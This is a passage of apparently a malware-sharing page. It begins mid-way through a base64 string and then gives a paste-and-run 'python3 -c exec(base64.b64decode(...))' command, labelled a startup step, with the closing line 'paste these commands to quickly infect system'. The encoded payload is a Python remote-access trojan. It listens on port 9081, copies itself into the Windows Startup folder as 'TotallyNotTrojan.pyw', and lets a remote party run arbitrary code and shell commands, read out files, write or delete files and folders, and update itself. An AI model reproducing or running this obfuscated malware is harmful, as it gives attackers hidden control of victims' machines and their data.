ICAgICAgIGZsc2YgPSBvcy5saXN0ZGlyKHBhdGgpCiAgICAgICAgICAgIGZscyA9IHN0cihmbHNmKS5lbmNvZGUoInV0Zi04IikKICAgICAgICAgICAgY29ubi5zZW5kKGZscykKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjogcGFzcwpkZWYgY2F0KGZsKToKICAgIHdpdGggb3BlbihmbCwgInJiIikgYXMgZjoKICAgICAgICBjb25uLnNlbmQoZi5yZWFkKCkpCiAgICAgICAgZi5jbG9zZSgpCndoaWxlIFRydWU6CiAgICBjb25uLCBhZGRyID0gc29jay5hY2NlcHQoKQogICAgZGF0YSA9IGNvbm4ucmVjdigxNjM4NCkKICAgIHVkYXRhID0gZGF0YS5kZWNvZGUoInV0Zi04IikKICAgIGlmIHVkYXRhID09ICJ1cGRhdGUiOnVwdG9kYXRlKCkKICAgIGlmIHVkYXRhID09ICJleGVjcHkiOgogICAgICAgIHB5Y29tbWYgPSBjb25uLnJlY3YoMTYzODQpCiAgICAgICAgcHljb21tID0gcHljb21tZi5kZWNvZGUoInV0Zi04IikKICAgICAgICBleGVjcHkoKQogICAgaWYgdWRhdGEgPT0gIm1rZGlyIjoKICAgICAgICBmb2xkZXJ0b2NyZWF0ZSA9IGNvbm4ucmVjdigxNjM4NCkKICAgICAgICBmb2xkZXJ0b2NyZWF0ZWRlYyA9IGZvbGRlcnRvY3JlYXRlLmRlY29kZSgidXRmLTgiKQogICAgICAgIGRpcmVjdG9yeSgpCiAgICBpZiB1ZGF0YSA9PSAiZmlsZSI6CiAgICAgICAgYWJvdXRmaWxlID0gY29ubi5yZWN2KDE2Mzg0KQogICAgICAgIGZpbGVkYXRhID0gY29ubi5yZWN2KDE2Mzg0KQogICAgICAgIGZpbGVkYXRhZGVjID0gZmlsZWRhdGEuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgZmlsZXMoKQogICAgaWYgdWRhdGEgPT0gInJtZGlyIjoKICAgICAgICBmb2xkdG9yZW0gPSBjb25uLnJlY3YoMTYzODQpCiAgICAgICAgZm9sZHRvcmVtZGVjID0gZm9sZHRvcmVtLmRlY29kZSgidXRmLTgiKQogICAgICAgIHJlbW92ZWZsZCgpCiAgICBpZiB1ZGF0YSA9PSAicm0iOgogICAgICAgIGZpbGV0b3JlbSA9IGNvbm4ucmVjdigxNjM4NCkKICAgICAgICBmaWxldG9yZW1kZWMgPSBmaWxldG9yZW0uZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgcmVtb3ZlKCkKICAgIGlmIHVkYXRhID09ICJscyI6bHMoKQogICAgaWYgdWRhdGEgPT0gInNlbGZ0ZXN0IjpzZWxmdGVzdCgpCiAgICBpZiB1ZGF0YSA9PSAic2hlbGwiOnByb21wdChjb25uLnJlY3YoMTYzODQpLmRlY29kZSgidXRmLTgiKSkKICAgIGlmIHVkYXRhID09ICJjYXQiOgogICAgICAgIGNhdChjb25uLnJlY3YoMTYzODQpLmRlY29kZSgidXRmLTgiKSkKICAgIGVsc2U6cGFzcztjb25uLmNsb3NlKCkK'))" &
```
# *-nix startup
```
python3 -c "import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCwgb3MsIHRpbWUsIGN0eXBlcwpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZGludDtWRVJTSU9OID0gIkJVSUxEIDE0MjUuTk9VUEQgKEVuY29kZWQgaW4gQjY0KSIKc29jayA9IHNvY2tldC5zb2NrZXQoKTtzb2NrLmJpbmQoKCIiLCA5MDgxKSk7c29jay5saXN0ZW4oMTApCmltcG9ydCBzeXMsIGdldHBhc3MKYm9vdCA9ICJDOi9Vc2Vycy8iK2dldHBhc3MuZ2V0dXNlcigpKyIvQXBwRGF0YS9Sb2FtaW5nL01pY3Jvc29mdC9XaW5kb3dzL1N0YXJ0IE1lbnUvUHJvZ3JhbXMvU3RhcnR1cC9Ub3RhbGx5Tm90VHJvamFuLnB5dyIKaWYgc3lzLmFyZ3ZbMF0gIT0gYm9vdDoKICAgIHRyeToKICAgICAgICBpbXBvcnQgc2h1dGlsCiAgICAgICAgc2h1dGlsLmNvcHlmaWxlKHN5cy5hcmd2WzBdLCBib290KQogICAgICAgIG9zLnJlbW92ZShzeXMuYXJndlswXSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCmRlZiB1cHRvZGF0ZSgpOgogICAgZGF0YSA9IGNvbm4ucmVjdigxMDAwMDAwKS5kZWNvZGUoInV0Zi04IikKICAgIHdpdGggb3BlbigiVG90YWxseU5vdFRyb2phbi5weXciLCAidyIpIGFzIGY6CiAgICAgICAgZi53cml0ZShkYXRhKQogICAgICAgIGYuY2xvc2UoKQpkZWYgc2VsZnRlc3QoKTpjb25uLnNlbmQoVkVSU0lPTi5lbmNvZGUoInV0Zi04IikpCmRlZiBleGVjcHkoKTpleGVjKHB5Y29tbSkKZGVmIHRhbGsoKToKICAgIHRyeToKICAgICAgICB0YWxrZmlsZSA9IG9wZW4oIjEudmJzIiwgInciKQogICAgICAgIHRhbGtmaWxlLndyaXRlKCJzZXQgc2FwaT1DcmVhdGVPYmplY3QoXCJzYXBpLnNwdm9pY2VcIikgXG4gc2FwaS5zcGVhayBcIiIrdGV4dHRvdGFsaysiXCIiKQogICAgICAgIHRhbGtmaWxlLmNsb3NlKCkKICAgICAgICBvcy5zeXN0ZW0oInN0YXJ0IDEudmJzIik7dGltZS5zbGVlcCgxKTtvcy5zeXN0ZW0oImRlbCAxLnZicyIpCiAgICBleGNlcHQ6cGFzcwpkZWYgbWVzcygpOmN0eXBlcy53aW5kbGwudXNlcjMyLk1lc3NhZ2VCb3hXKDAsIG1lc3NhZ2UsIHRpdGxlLCAwKQpkZWYgbmljZSgpOgogICAgdHJ5OgogICAgICAgIGQgPSByYW5kaW50KDEsIDQpCiAgICAgICAgaWYgZCA9PSAxOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9SaWJib25zLnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSAyOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9CdWJibGVzLnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSAzOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9NeXN0aWZ5LnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSA0Om9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9zc1RleHQzZC5zY3IgLXMiKQogICAgZXhjZXB0OnBhc3MKZGVmIGRpcmVjdG9yeSgpOgogICAgdHJ5Om9zLm1rZGlyKGZvbGRlcnRvY3JlYXRlZGVjKQogICAgZXhjZXB0OnBhc3MKZGVmIGNkam9rZSgpOgogICAgdHJ5OgogICAgICAgIHRhbGtmaWxlID0gb3BlbigiMS52YnMiLCAidyIpCiAgICAgICAgdGFsa2ZpbGUud3JpdGUoIlNldCBvYmpXTVAgPSBDcmVhdGVPYmplY3QoXCJXTVBsYXllci5PQ1guN1wiKVxuU2V0IGNvbENEcyA9IG9ialdNUC5jZHJvbUNvbGxlY3Rpb25cbmNvbENEcy5JdGVtKDApLkVqZWN0XG5Nc2dCb3ggXCJQcmVzcyBhbnkga2V5IHRvIGNsb3NlIENEXCIsNjQsXCJPcGVuIENsb3NlIENkIFRyYXlcIlxuY29sQ0RzLkl0ZW0oMCkuRWplY3QiKQogICAgICAgIHRhbGtmaWxlLmNsb3NlKCkKICAgICAgICBvcy5zeXN0ZW0oInN0YXJ0IDEudmJzIik7dGltZS5zbGVlcCgxKTtvcy5zeXN0ZW0oImRlbCAxLnZicyIpCiAgICBleGNlcHQ6cGFzcwpkZWYgZnVuKCk6b3MucG9wZW4oImV4cGxvcmVyIGh0dHBzOi8veW91dHViZS5jb20iKQpkZWYgZmlsZXMoKToKICAgIHRyeToKICAgICAgICBmaWxlcyA9IG9wZW4oYWJvdXRmaWxlLCAidyIpCiAgICAgICAgZmlsZXMud3JpdGUoZmlsZWRhdGFkZWMpCiAgICAgICAgZmlsZXMuY2xvc2UoKQogICAgZXhjZXB0OnBhc3MKZGVmIHByb21wdChhcmcpOm9zLnBvcGVuKGFyZykKZGVmIHJlbW92ZWZsZCgpOgogICAgdHJ5Om9zLnJtZGlyKGZvbGR0b3JlbWRlYykKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjpwYXNzCmRlZiByZW1vdmUoKToKICAgIHRyeTpvcy5yZW1vdmUoZmlsZXRvcmVtZGVjKQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOnBhc3MKZGVmIGxzKCk6CiAgICB0cnk6CiAgICAgICAgcGF0aCA9IGNvbm4ucmVjdigxMDAwNSkuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgaWYgcGF0aCAhPSBOb25lIGFuZCBwYXRoICE9ICIiOgogICAgICAgICAgICBmbHNmID0gb3MubGlzdGRpcihwYXRoKQogICAgICAgICAgICBmbHMgPSBzdHIoZmxzZi5lbmNvZGUoInV0Zi04IikpCiAgICAgICAgICAgIGNvbm4uc2VuZChmbHMpCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6IHBhc3MKZGVmIGNhdChmbCk6CiAgICB3aXRoIG9wZW4oZmwsICJyYiIpIGFzIGY6CiAgICAgICAgY29ubi5zZW5kKGYucmVhZCgpKQogICAgICAgIGYuY2xvc2UoKQp3aGlsZSBUcnVlOgogICAgY29ubiwgYWRkciA9IHNvY2suYWNjZXB0KCkKICAgIGRhdGEgPSBjb25uLnJlY3YoMTYzODQpCiAgICB1ZGF0YSA9IGRhdGEuZGVjb2RlKCJ1dGYtOCIpCiAgICBpZiB1ZGF0YSA9PSAidXBkYXRlIjp1cHRvZGF0ZSgpCiAgICBpZiB1ZGF0YSA9PSAiZXhlY3B5IjoKICAgICAgICBweWNvbW1mID0gY29ubi5yZWN2KDE2Mzg0KQogICAgICAgIHB5Y29tbSA9IHB5Y29tbWYuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgZXhlY3B5KCkKICAgIGlmIHVkYXRhID09ICJmdW4iOmZ1bigpCiAgICBpZiB1ZGF0YSA9PSAibmljZSI6bmljZSgpCiAgICBpZiB1ZGF0YSA9PSAibWtkaXIiOgogICAgICAgIGZvbGRlcnRvY3JlYXRlID0gY29ubi5yZWN2KDE2Mzg0KQogICAgICAgIGZvbGRlcnRvY3JlYXRlZGVjID0gZm9sZGVydG9jcmVhdGUuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgZGlyZWN0b3J5KCkKICAgIGlmIHVkYXRhID09ICJmaWxlIjoKICAgICAgICBhYm91dGZpbGUgPSBjb25uLnJlY3YoMTYzODQpCiAgICAgICAgZmlsZWRhdGEgPSBjb25uLnJlY3YoMTYzODQpCiAgICAgICAgZmlsZWRhdGFkZWMgPSBmaWxlZGF0YS5kZWNvZGUoInV0Zi04IikKICAgICAgICBmaWxlcygpCiAgICBpZiB1ZGF0YSA9PSAicm1kaXIiOgogICAgICAgIGZvbGR0b3JlbSA9IGNvbm4ucmVjdigxNjM4NCkKICAgICAgICBmb2xkdG9yZW1kZWMgPSBmb2xkdG9yZW0uZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgcmVtb3ZlZmxkKCkKICAgIGlmIHVkYXRhID09ICJybSI6CiAgICAgICAgZmlsZXRvcmVtID0gY29ubi5yZWN2KDE2Mzg0KQogICAgICAgIGZpbGV0b3JlbWRlYyA9IGZpbGV0b3JlbS5kZWNvZGUoInV0Zi04IikKICAgICAgICByZW1vdmUoKQogICAgaWYgdWRhdGEgPT0gIm1lc3NhZ2UiOgogICAgICAgIG1lc3NhZ2VmID0gY29ubi5yZWN2KDE2MDApCiAgICAgICAgdGl0bGVmID0gY29ubi5yZWN2KDE2MDApCiAgICAgICAgbWVzc2FnZSA9IG1lc3NhZ2VmLmRlY29kZSgidXRmLTgiKQogICAgICAgIHRpdGxlID0gdGl0bGVmLmRlY29kZSgidXRmLTgiKQogICAgICAgIG1lc3MoKQogICAgaWYgdWRhdGEgPT0gInRhbGsiOgogICAgICAgIHRleHR0b3RhbGtmID0gY29ubi5yZWN2KDE2MDApCiAgICAgICAgdGV4dHRvdGFsayA9IHRleHR0b3RhbGtmLmRlY29kZSgidXRmLTgiKQogICAgICAgIHRhbGsoKQogICAgaWYgdWRhdGEgPT0gImxzIjpscygpCiAgICBpZiB1ZGF0YSA9PSAic2VsZnRlc3QiOnNlbGZ0ZXN0KCkKICAgIGlmIHVkYXRhID09ICJzaGVsbCI6cHJvbXB0KGNvbm4ucmVjdigxNjM4NCkuZGVjb2RlKCJ1dGYtOCIpKQogICAgaWYgdWRhdGEgPT0gImNkam9rZSI6Y2Rqb2tlKCkKICAgIGlmIHVkYXRhID09ICJjYXQiOgogICAgICAgIGNhdChjb25uLnJlY3YoMTYzODQpLmRlY29kZSgidXRmLTgiKSkKICAgIGVsc2U6cGFzcztjb25uLmNsb3NlKCk='))" &
```
Open terminal and paste these commands to quickly infect system
